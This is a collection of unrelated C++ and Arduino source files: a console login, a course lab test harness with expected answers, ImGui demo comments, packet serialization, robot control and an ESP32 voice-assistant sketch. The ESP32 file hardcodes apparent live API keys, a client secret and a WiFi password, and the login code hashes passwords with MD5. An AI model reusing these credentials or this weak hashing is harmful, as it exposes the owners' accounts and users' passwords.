== name) { //\u5224\u65ad\u5df2\u6ce8\u518c\u7528\u6237\u540d\r\n            cout << \"this username has been registered\" << endl;\r\n            fin.close();\r\n            regist();\r\n            return;\r\n        }\r\n    }\r\n    char test;\r\n    int  i = 0;\r\n    cout << \"please input your password:\";\r\n    while ((test = getch()) != '\\r') {\r\n        if (test == 8) //ASCII\u78018\u4e3a\u9000\u683c\r\n        {\r\n            if (i > 0) {\r\n                cout << test << \" \" << test;\r\n                password[i--] = '\\0';\r\n            }\r\n        } else {\r\n            if (i < 100) {\r\n                cout << \"*\";\r\n                password[i] = test;\r\n                i++;\r\n            }\r\n        }\r\n    }\r\n    password[i] = '\\0';\r\n    cout << \"\\nplease input your password again:\";\r\n    char *password2 = new char[100];\r\n    i               = 0;\r\n    while ((test = getch()) != '\\r') {\r\n        if (test == 8) {\r\n            if (i > 0) {\r\n                cout << test << \" \" << test;\r\n                password2[i--] = '\\0';\r\n            }\r\n        } else {\r\n            if (i < 100) {\r\n                cout << \"*\";\r\n                password2[i] = test;\r\n                i++;\r\n            }\r\n        }\r\n        password2[i] = '\\0';\r\n    }\r\n    if (strcmp(password, password2) != 0) { //\u5224\u65ad\u4e24\u6b21\u8f93\u5165\u7684\u5bc6\u7801\u662f\u5426\u4e00\u81f4\r\n        cout << \"\\nPassword entered incorrectly twice\\n\";\r\n        fin.close();\r\n        regist();\r\n    } else {\r\n        cout << \"\\nregistration success\\n\";\r\n        fin.close();\r\n        ofstream fout;\r\n        fout.open(\"user.dat\", ios::binary | ios_base::app | ios_base::out);\r\n        fout << name << \" \" << md5(password) << endl;\r\n        fout.close(); //\u5173\u95ed\u6587\u4ef6\u8fde\u63a5\r\n        delete[] password;\r\n        delete[] password2;\r\n        cout << \"Return to login interface\\n\";\r\n        homepage();\r\n    }\r\n}",
    "#include \"FileManager.h\"\n\nFileManager::FileManager(std::string filepath)\n{\n    this->_fs = std::fstream(filepath);\n    if (!this->_fs.is_open())\n    {\n        std::cerr << \"[Error:file] The file \" << filepath << \" can't be openned\" << std::endl;\n        throw std::runtime_error(\"Can't open the file\");\n    }\n}\n\nFileManager::~FileManager()\n{\n    this->_fs.close();\n}\n\nint FileManager::insertInFile(std::string data, int line)\n{\n    if(line < 0){\n        std::cout << \"Inserting data at the end of the file\" << std::endl;\n        this->_fs << data << std::endl;\n        return 0;\n    }\n\n    std::cout << \"Inserting data in line \" << line << std::endl;\n    if (!this->_fs)\n    {\n        std::cout << \"[Error:file] No file stream\" << line << std::endl;\n        throw std::runtime_error(\"[Error:file] No file stream\");\n    }\n\n    std::vector<std::string> lines;\n    std::string temp;\n    while (std::getline(this->_fs, temp))\n    {\n        lines.push_back(temp);\n    }\n\n    if (line < 0 || line > lines.size())\n    {\n        std::cout << \"[Error:file] The line number is out of range\" << std::endl;\n        throw std::runtime_error(\"[Error:file] The line number is out of range\");\n    }\n\n    lines.insert(lines.begin() + line, data);\n\n    this->_fs.clear();\n    this->_fs.seekp(0, std::ios::beg);\n    for (auto &l : lines)\n    {\n        this->_fs << l << std::endl;\n    }\n\n\n\n\n    return 0;\n}\n",
    "#include \"deals.h\"\n#include <iostream>\n#include <vector>\n#include <map>\n#include <functional>\n\nusing cost = long long;\n\n// Project Identifier: D7E20F91029D0CB08715A2C54A782E0E8DF829BF\n\n/****************************************************\n *                                                  *\n *  (\\     ___        Congrats on making it to      *\n *  (  \\  /(o)\\       the last lab of EECS 281!     *\n *  (   \\/  ()/ /)    I hope you enjoyed the ride.  *\n *   (   `;.))'\".)                                  *\n *    `(/////.-'      Good luck, and have fun       *\n * =====))=))===()    with dynamic programming!     *\n *   ///'                                           *\n *  //   PjP/ejm                ~ EECS 281 Staff    *\n * '                                                *\n *                                                  *\n ****************************************************/\n\nint main() {\n    {\n        // sample #1\n        // # meals == 6\n\t    std::vector<cost> sample_input = {3, 3, 3, 3, 3, 100};\n\t    std::cout << \"[meal  #1] ... \" << std::endl;\n\t    cost student_answer = best_price(sample_input);\n\t    if (student_answer != 15) {\n\t        std::cout << \"FAIL: expected 15 but got \" << student_answer << std::endl;\n\t        // for your reference in debugging the above test case:\n\t        // total cost with no discount or promotion: 115\n\t        // total cost if only discounting with coupons: 85\n\t        // total cost if always applying punchcard: 15\n\t    } else {\n\t        std::cout << \"PASS\" << std::endl;\n\t    }\n    }\n\n    {\n        // sample #2\n        // # meals == 5\n\t    std::vector<cost> sample_input = {2, 2, 2, 2, 100};\n\t    std::cout << \"[meal  #2] ... \" << std::endl;\n\t    cost student_answer = best_price(sample_input);\n\t    if (student_answer != 79) {\n\t        std::cout << \"FAIL: expected 79 but got \" << student_answer << std::endl;\n\t        // for your reference in debugging the above test case:\n\t        // total cost with no discount or promotion: 108\n\t        // total cost if only discounting with coupons: 79\n\t        // total cost if always applying punchcard: 108\n\t    } else {\n\t        std::cout << \"PASS\" << std::endl;\n\t    }\n    }\n\n    {\n        // sample #3\n        // # meals == 6\n\t    std::vector<cost> sample_input = {2, 2, 2, 2, 1000, 100};\n\t    std::cout << \"[meal  #3] ... \" << std::endl;\n\t    cost student_answer = best_price(sample_input);\n\t    if (student_answer != 829) {\n\t        std::cout << \"FAIL: expected 829 but got \" << student_answer << std::endl;\n\t        // for your reference in debugging the above test case:\n\t        // total cost with no discount or promotion: 1108\n\t        // total cost if only discounting with coupons: 829\n\t        // total cost if always applying punchcard: 1008\n\t    } else {\n\t        std::cout << \"PASS\" << std::endl;\n\t    }\n    }\n\n    {\n        // sample #4\n        // # meals == 5\n\t    std::vector<cost> sample_input = {1000, 2, 2, 2, 1000};\n\t    std::cout << \"[meal  #4] ... \" << std::endl;\n\t    cost student_answer = best_price(sample_input);\n\t    if (student_answer != 1503) {\n\t        std::cout << \"FAIL: expected 1503 but got \" << student_answer << std::endl;\n\t        // for your reference in debugging the above test case:\n\t        // total cost with no discount or promotion: 2006\n\t        // total cost if only discounting with coupons: 1503\n\t        // total cost if always applying punchcard: 2006\n\t    } else {\n\t        std::cout << \"PASS\" << std::endl;\n\t    }\n    }\n\n    {\n        // sample #5\n        // # meals == 9\n\t    std::vector<cost> sample_input = {1000, 2, 2, 2, 1001, 1002, 1003, 1004, 1005};\n\t    std::cout << \"[meal  #5] ... \" << std::endl;\n\t    cost student_answer = best_price(sample_input);\n\t    if (student_answer != 4263) {\n\t        std::cout << \"FAIL: expected 4263 but got \" << student_answer << std::endl;\n\t        // for your reference in debugging the above test case:\n\t        // total cost with no discount or promotion: 6021\n\t        // total cost if only discounting with coupons: 4512\n\t        // total cost if always applying punchcard: 5019\n\t    } else {\n\t        std::cout << \"PASS\" << std::endl;\n\t    }\n    }\n\n    {\n        // sample #6\n        // # meals == 11\n\t    std::vector<cost> sample_input = {1000, 2, 2, 2, 1001, 1002, 1003, 1004, 1005, 1006, 1007};\n\t    std::cout << \"[meal  #6] ... \" << std::endl;\n\t    cost student_answer = best_price(sample_input);\n\t    if (student_answer != 5770) {\n\t        std::cout << \"FAIL: expected 5770 but got \" << student_answer << std::endl;\n\t        // for your reference in debugging the above test case:\n\t        // total cost with no discount or promotion: 8034\n\t        // total cost if only discounting with coupons: 6021\n\t        // total cost if always applying punchcard: 7032\n\t    } else {\n\t        std::cout << \"PASS\" << std::endl;\n\t    }\n    }\n\n    {\n        // sample #7\n        // # meals == 12\n\t    std::vector<cost> sample_input = {1000, 2, 2, 2, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008};\n\t    ",
    "// dear imgui, v1.90.2 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Examp",
    "#include \"../include/packets/input_packet.h\"\n#include <cstring>\n\nsize_t InputPacket::calculateSize() const {\n    size_t totalSize = 0;\n    \n    // type, events size, cam angle\n    totalSize += sizeof(PacketType) + sizeof(size_t) + sizeof(float);\n    // events themselves\n    totalSize += sizeof(int) * events.size();\n\n    return totalSize;\n}\n\n// Ensure outData is large enough to store all the data that is intended to be serialized.\nvoid InputPacket::serialize(const InputPacket& input, char*& outData) {\n    char* temp = outData;\n\n    // serialize packet type\n    PacketType type = PLAYER_INPUT;\n    memcpy(temp, &type, sizeof(type));\n    temp += sizeof(type);\n    \n    // Serialize size of events\n    size_t numEvents = input.events.size();\n    memcpy(temp, &numEvents, sizeof(numEvents));\n    temp += sizeof(numEvents);\n\n    // Serialize events\n    memcpy(temp, input.events.data(), sizeof(int) * numEvents);\n    temp += sizeof(int) * numEvents;\n\n    // Serialize cam_angle\n    memcpy(temp, &input.cam_angle, sizeof(input.cam_angle));\n    temp += sizeof(input.cam_angle);\n}\n\nvoid InputPacket::deserialize(const char* inData, InputPacket& input) {\n    // skip packet type; we know it's INPUT if we're calling this\n    const char* temp = inData + sizeof(PacketType);\n\n    // Deserialize size of events\n    size_t numEvents;\n    memcpy(&numEvents, temp, sizeof(numEvents));\n    temp += sizeof(numEvents);\n\n    // Deserialize events\n    input.events.clear();\n    input.events.resize(numEvents);\n    memcpy(input.events.data(), temp, sizeof(int) * numEvents);\n    temp += sizeof(int) * numEvents;\n\n    // Deserialize cam_angle\n    memcpy(&input.cam_angle, temp, sizeof(input.cam_angle));\n}\n",
    "/******************************************************************************\n *\n * A brute-force implementation of the 3-sums problems.\n *\n * Based on the source code from Robert Sedgewick and Kevin Wayne at https://algs4.cs.princeton.edu/\n *\n *  A program with cubic running time. Read in N integers and counts the number of triples that sum to exactly 0\n *  (ignoring integer overflow).\n *\n *  ./3sums < ../data/8ints.txt \n *  4\n * \n *  ./3sums < ../data/1Kints.txt \n *  70\n *\n *  ./3sums < ../data/2Kints.txt \n *  528\n *\n *  ./3sums < ../data/4Kints.txt \n *  4039\n * \n *  ./3sums < ../data/8Kints.txt \n *  32074\n * \n *  ./3sums < ../data/16Kints.txt \n *  255181\n * \n *  ./3sums < ../data/32Kints.txt \n *  2052358\n * \n ******************************************************************************/\n\n#include <iostream>\n#include <iomanip>\n#include <ctime>\n\n#define MAX_SIZE 1000000\n\nusing namespace std;\n\n// prints the list of integers on the screen\nvoid print_list(const int* list, const int size) {\n    for (auto i = 0; i < size; i++) {\n        cout << list[i] << endl;\n    }\n    return;\n}\n\n// counts the number of triples that sum to exactly 0\nint count_3sums(const int* list, const int size) {\n    int count = 0;\n    for (auto i = 0; i < size; i++) {\n        for (auto j = i + 1; j < size; j++) {\n            for (auto k = j + 1; k < size; k++) {\n                if (list[i] + list[j] + list[k] == 0) {\n                    count++;\n                }\n            }\n        }\n    }\n    return count;\n}\n\n// main entry point of the program\nint main(int argc, char* argv[]) {\n    int a[MAX_SIZE];\n    int n = 0;\n\n    // read the list of integers from the standard input\n    while (n < MAX_SIZE && (cin >> a[n])) {\n        n++;\n    }\n\n    // get the initial clock count\n    auto start = clock();\n\n    // computes the number of triples that sum to exactly 0 and outputs the count on the screen\n    cout << count_3sums(a, n) << endl;\n\n    // output execution time\n    cout << \"Time of execution: \" \n         << setprecision(4) \n         << double(clock() - start)/double(CLOCKS_PER_SEC) \n         << \" seconds\" << endl;\n\n    return (0);\n}\n",
    "\r\n\r\n#include <WiFi.h>  // \u5305\u542bWiFi\u5e93\r\n#include <HTTPClient.h>  // \u5305\u542bHTTPClient\u5e93\r\n#include <ArduinoJson.h>  // \u5305\u542bArduinoJson\u5e93\r\n#include <SoftwareSerial.h>  // \u5305\u542bSoftwareSerial\u5e93\uff08\u7528\u4e8e\u4e32\u53e3\u901a\u8baf\uff09\r\n#include <driver/i2s.h> // \u7528\u4e8e\u914d\u7f6eI2S\u7684\u9a71\u52a8\r\n#include \"base64.h\"\r\n#include \"cJSON.h\"\r\n\r\n// \u5e38\u91cf\u548c\u5b8f\u5b9a\u4e49\r\n#define key 0\r\n#define ADC 2\r\n\r\n// \u5b9a\u4e49\u6a21\u62df\u4e32\u53e3\u7684\u53d1\u9001\u7aef\u53e3\r\n#define TX_PIN 17\r\n#define RX_PIN 18\r\n\r\n\r\nconst int DEV_PID = 1537;\r\nconst char* CUID = \"44950592\";\r\nconst char* CLIENT_ID = \"myQ10rFInKFzFtd6EjRLjMET\";\r\nconst char* CLIENT_SECRET = \"ObU2fYI7xzOCtJTyXKDpxVhV6mHRV4Xw\";\r\n\r\nconst char* ssid = \"HONOR\";  // WiFi\u7f51\u7edc\u540d\u79f0\r\nconst char* password = \"wrqcctv123\";  // WiFi\u5bc6\u7801\r\n\r\nconst char* TTS_URL = \"http://tsn.baidu.com/text2audio\";  // TTS\u670d\u52a1URL\r\nconst char* TOKEN_URL = \"http://openapi.baidu.com/oauth/2.0/token\";  // \u83b7\u53d6token\u7684URL\r\n\r\nconst String ChatMindAiUrl = \"https://api.chatanywhere.com.cn/v1/chat/completions\";  // ChatMindAi API\u5730\u5740\r\nconst String ChatMindAiApiKey = \"sk-tetT9sM4MSA8a3LGJcZGxfuyN4c0fAfrcVm9uwqAJA2Yt3bq\";  // \u66ff\u6362\u4e3a\u4f60\u7684ChatMindAi API\u5bc6\u94a5\r\n\r\nstatic const i2s_port_t i2s_num = I2S_NUM_1;  // i2s\u7aef\u53e3\u53f7\uff0c\u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u5185\u90e8DAC\uff0c\u5219\u5fc5\u987b\u4f7f\u7528I2S_NUM_0\r\n\r\nHTTPClient http_client;\r\nhw_timer_t* timer = NULL;\r\nconst int recordTimeSeconds = 5;\r\nconst int adc_data_len = 16000 * recordTimeSeconds;\r\nconst int data_json_len = adc_data_len * 2 * 1.4;\r\nuint16_t* adc_data;\r\nchar* data_json;\r\nuint8_t adc_start_flag = 0;\r\nuint8_t adc_complete_flag = 0;\r\nuint32_t num = 0;\r\nportMUX_TYPE timerMux = portMUX_INITIALIZER_UNLOCKED;\r\nuint32_t DataIdx = 0;\r\n\r\nWiFiClient client;  // \u521b\u5efaWiFi\u5ba2\u6237\u7aef\u5bf9\u8c61\r\n\r\nvoid IRAM_ATTR onTimer();\r\nString gainToken();\r\nvoid assembleJson(String token);\r\nvoid sendToSTT();\r\nString getGPTAnswer();\r\nvoid textToSpeech(const char* text);\r\n\r\nString uservoice;\r\nString cleanResult;\r\nString escapedResult;\r\nString prompter = \"\u4ecb\u7ecd\u4e00\u4e0b\u4f60\u81ea\u5df1\u3002\";\r\nuint32_t time1, time2;\r\n\r\n// I2S\u914d\u7f6e\u7ed3\u6784\u4f53\r\nstatic const i2s_config_t i2s_config = {\r\n    .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_TX),\r\n    .sample_rate = 16000,    // \u91c7\u6837\u738716000\r\n    .bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT,\r\n    .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\r\n    .communication_format = (i2s_comm_format_t)(I2S_COMM_FORMAT_I2S | I2S_COMM_FORMAT_I2S_MSB),\r\n    .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,       // \u9ad8\u4f18\u5148\u7ea7\u4e2d\u65ad\r\n    .dma_buf_count = 8,                             // 8\u4e2a\u7f13\u51b2\u533a\r\n    .dma_buf_len = 1024,                            // \u6bcf\u4e2a\u7f13\u51b2\u533a1K\u5b57\u8282\uff0c\u603b\u51718K\u5b57\u8282\u7684\u7f13\u51b2\u533a\u7a7a\u95f4\r\n    .use_apll = 0,\r\n    .tx_desc_auto_clear = true,\r\n    .fixed_mclk = -1\r\n};\r\n\r\nstatic const i2s_pin_config_t pin_config = {\r\n    .bck_io_num = 46,                     // \u65f6\u949f\u53e3\uff0c\u5bf9\u5e94\u4e8eMAX38357A\u7684BCLK\r\n    .ws_io_num = 15,                      // \u7528\u4e8e\u58f0\u9053\u9009\u62e9\uff0c\u5bf9\u5e94\u4e8eMAX38357A\u7684LRC\r\n    .data_out_num = 3,                   // ESP32\u7684\u97f3\u9891\u8f93\u51fa\u53e3, \u5bf9\u5e94\u4e8eMAX38357A\u7684DIN\r\n    //.data_in_num = I2S_PIN_NO_CHANGE      // ESP32\u7684\u97f3\u9891\u8f93\u5165\u63a5\u53e3\uff0c\u672c\u4f8b\u672a\u7528\u5230\r\n};\r\n\r\n\r\n// \u51fd\u6570\uff1a\u5c06\u5b57\u7b26\u4e32\u8fdb\u884cURL\u7f16\u7801\r\nString urlencode(const String& str) {\r\n    String encodedString = \"\";\r\n    char c;\r\n    char code0;\r\n    char code1;\r\n    for (unsigned int i = 0; i < str.length(); i++) {\r\n        c = str.charAt(i);\r\n        if (c == ' ') {\r\n            encodedString += '+';  // \u5c06\u7a7a\u683c\u66ff\u6362\u4e3a\u52a0\u53f7\r\n        }\r\n        else if (isalnum(c)) {\r\n            encodedString += c;  // \u5c06\u5b57\u6bcd\u548c\u6570\u5b57\u76f4\u63a5\u6dfb\u52a0\u5230\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\r\n        }\r\n        else {\r\n            code1 = (c & 0xf) + '0';\r\n            if ((c & 0xf) > 9) {\r\n                code1 = (c & 0xf) - 10 + 'A';  // \u83b7\u53d6\u5b57\u7b26\u7684\u4f4e4\u4f4d\uff0c\u5e76\u8f6c\u6362\u4e3a\u5bf9\u5e94\u768416\u8fdb\u5236\u5b57\u7b26\r\n            }\r\n            c = (c >> 4) & 0xf;\r\n            code0 = c + '0';\r\n            if (c > 9) {\r\n                code0 = c - 10 + 'A';  // \u83b7\u53d6\u5b57\u7b26\u7684\u9ad84\u4f4d\uff0c\u5e76\u8f6c\u6362\u4e3a\u5bf9\u5e94\u768416\u8fdb\u5236\u5b57\u7b26\r\n            }\r\n            encodedString += '%';  // \u6dfb\u52a0URL\u7f16\u7801\u7684\u524d\u7f00\r\n            encodedString += code0;  // \u6dfb\u52a0\u9ad84\u4f4d\u768416\u8fdb\u5236\u5b57\u7b26\r\n            encodedString += code1;  // \u6dfb\u52a0\u4f4e4\u4f4d\u768416\u8fdb\u5236\u5b57\u7b26\r\n        }\r\n        yield();  // \u653e\u5f03CPU\u63a7\u5236\u6743\uff0c\u4f7f\u5176\u4ed6\u4efb\u52a1\u6709\u673a\u4f1a\u6267\u884c\r\n    }\r\n    return encodedString;  // \u8fd4\u56de\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\r\n}\r\n\r\n\r\n\r\nvoid textToSpeech(const char* text) {\r\n    HTTPClient http;\r\n    String token = gainToken();  // \u83b7\u53d6\u8bbf\u95ee\u4ee4\u724c\r\n    Serial.println(\"Access Token: \" + token);  // \u6253\u5370\u8bbf\u95ee\u4ee4\u724c\r\n    String encoded_text = urlencode(text);  // \u5c06\u6587\u672c\u8fdb\u884cURL\u7f16\u7801\r\n    // \u6784\u5efaTTS\u8bf7\u6c42\u53c2\u6570\r\n    String tts_params = \"tok=\" + token + \"&tex=\" + encoded_text + \"&cuid=esp32&lan=zh&ctp=1&aue=4&spd=4&pit=5&vol=5&per=0\";\r\n\r\n    if (http.begin(client, TTS_URL)) {\r\n        http.addHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");  // \u6dfb\u52a0HTTP\u5934\u90e8\r\n        int httpCode = http.POST(tts_params);  // \u53d1\u9001POST\u8bf7\u6c42\r\n\r\n        if (httpCode > 0) {\r\n            if (httpCode == HTTP_CODE_OK) {\r\n                const size_t availableSize = 1 * 1024 * 1024;\r\n                size_t bytesRead = 0;\r\n                char* audioData = (char*)heap_caps_malloc(availableSize, MALLOC_CAP_SPIRAM);\r\n                if (audioData != nullptr) {\r\n                    WiFiClient* stream = http.getStreamPtr();  // \u83b7\u53d6HTTP\u54cd\u5e94\u6d41\r\n                    bytesRead = stream->readBytes(audioData, availableSize);  // \u8bfb\u53d6\u97f3\u9891\u6570\u636e\r\n                    // \u68c0\u67e5\u662f\u5426\u8bfb\u53d6\u5230\u4e86\u6570\u636e\r\n                    if (bytesRead > 0) {\r\n                        // \u8fd9\u91cc\u5047\u8bbeDataIdx\u662f\u5728\u51fd\u6570\u5916\u90e8\u5b9a\u4e49\u7684\r\n                        Da",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2024, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer.\n\n* Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer in the documentation and/or other\nmaterials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\ncontributors may be used to endorse or promote products\nderived from this software without specific prior\nwritten permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n#include \"UnitTestPCH.h\"\n\n// TODO\n",
    "#include \"main.h\"\n#include \"units/Angle.hpp\"\n#include \"units/Vector2D.hpp\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n    static bool pressed = false;\n    pressed = !pressed;\n    if (pressed) {\n        pros::lcd::set_text(2, \"I was pressed!\");\n    } else {\n        pros::lcd::clear_line(2);\n    }\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n    pros::lcd::initialize();\n    pros::lcd::set_text(1, \"Hello PROS User!\");\n    pros::lcd::register_btn1_cb(on_center_button);\n    units::Vector2D<AngularAcceleration> a(1_rpm2, 2_rpm2);\n    a.theta().convert(deg);\n    to_cDeg(a.theta());\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n    pros::Controller master(pros::E_CONTROLLER_MASTER);\n    pros::MotorGroup left_mg({1, -2, 3}); // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n    pros::MotorGroup right_mg({-4, 5, -6}); // Creates a motor group with forwards port 4 and reversed ports 4 & 6\n\n    while (true) {\n        pros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n                         (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\n                         (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0); // Prints status of the emulated screen LCDs\n\n        // Arcade control scheme\n        int dir = master.get_analog(ANALOG_LEFT_Y); // Gets amount forward/backward from left joystick\n        int turn = master.get_analog(ANALOG_RIGHT_X); // Gets the turn left/right from right joystick\n        left_mg.move(dir - turn); // Sets left motor voltage\n        right_mg.move(dir + turn); // Sets right motor voltage\n        pros::delay(20); // Run for 20 ms then update\n    }\n}",
    "\n#include \"Action.h\"\n\nAction::Action(void)\n{\n  this->class_name = \"Action\";\n  this->name = \"\";\n}\n\nAction::Action(std::string core_arg_host_url,\n\t       std::string core_arg_class_name, std::string core_arg_object_id,\n\t       std::string arg_name)\n  : Core { core_arg_host_url, core_arg_class_name, core_arg_object_id }\n{\n  this->class_name = \"Action\";\n  this->name = arg_name;\n}\n\nbool\nAction::operator==\n(Action aAction)\n{\n  return ((this->name) == aAction.name);\n}\n\nJson::Value *\nAction::dump2JSON\n(void)\n{\n  Json::Value * result_ptr = this->Core::dump2JSON();\n\n  if (this->name != \"\")\n    {\n      (*result_ptr)[\"name\"] = this->name;\n      return result_ptr;\n    }\n  else\n    {\n      return (Json::Value *) NULL;\n    }\n}\n\nvoid\nAction::JSON2Object\n(Json::Value * arg_json_ptr)\n{\n  Exception_Info * ei_ptr = NULL;\n  ecs36b_Exception * lv_exception_ptr = new ecs36b_Exception {};\n\n  if (arg_json_ptr == ((Json::Value *) NULL))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_ACTION;\n      ei_ptr->which_string = 